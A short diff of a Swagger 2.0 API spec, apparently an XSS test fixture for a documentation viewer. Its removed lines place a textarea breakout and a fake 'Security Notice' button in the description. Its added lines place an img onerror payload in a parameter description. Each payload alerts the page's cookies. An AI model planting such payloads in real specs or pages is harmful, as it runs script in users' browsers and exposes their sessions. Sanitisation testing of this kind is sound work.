@@ -1,11 +1,17 @@
 swagger: '2.0'
 info:
-  title: Test API
-  description: |-
-    </textarea></xmp>
-    <style>button {background:red; color:white; padding:12px;}</style>
-    <button onclick="alert(document.domain + '\nCookie: ' + document.cookie)">
-      Security Notice – Click to Continue
-    </button>
+  title: Alert Test
   version: 1.0.0
-paths: {}
+paths:
+  /users:
+    get:
+      parameters:
+        - name: token
+          in: query
+          description: |
+            <img src=1 onerror="alert('XSS from parameter description! ' + document.cookie)">
+          required: false
+          type: string
+      responses:
+        '200':
+          description: OK
